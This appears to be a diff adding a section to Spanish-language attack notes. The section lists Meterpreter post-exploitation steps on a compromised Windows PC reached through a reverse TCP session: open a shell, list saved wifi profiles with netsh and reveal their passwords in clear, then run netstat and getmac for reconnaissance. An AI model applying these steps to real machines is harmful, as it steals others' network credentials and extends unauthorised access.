@@ -525,6 +525,24 @@ rmdir <nombre directorio> (Borrar directorio)
 --- run
 --- A este punto es posible ver lo que se está haciendo en la pc con windows
 
+++ Ver contraseñas wifi salvadas
+--- msfconsole
+--- meterpreter
+--- run
+--- meterpreter > shell (se debe tener ya una sesion abierta con el ataque reverse tcp)
+--- netsh wlan show profile
+--- Aparecerán los perfiles wifi
+--- netsh wlan show <nombre_perfil> key=clear
+--- En la sección Key Content el password será visible
+--- netsh wlan show interface (Comando para verificar si la pc con windows está conectada a un wifi)
+--- netstat (Comando para mostrar las conexiones que tiene la pc con windows)
+--- getmac (Comando para ver las direcciones mac de todas las interfaces de red)
+
+
+
+
+
+
 
 
 
